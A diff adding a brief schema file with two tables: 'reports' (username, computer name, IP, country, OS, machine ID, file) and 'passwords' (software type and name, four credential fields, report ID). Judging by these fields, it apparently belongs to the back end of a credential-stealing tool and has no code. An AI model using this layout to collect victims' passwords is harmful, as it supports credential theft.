@@ -1,0 +1,21 @@
+﻿reports
+	*id
+	date
+	username
+	compname
+	ip
+	country
+	os
+	machine_id
+	file
+	
+	
+passwords
+	soft_type
+	soft_name
+	p1
+	p2
+	p3
+	p4
+	report_id
+	
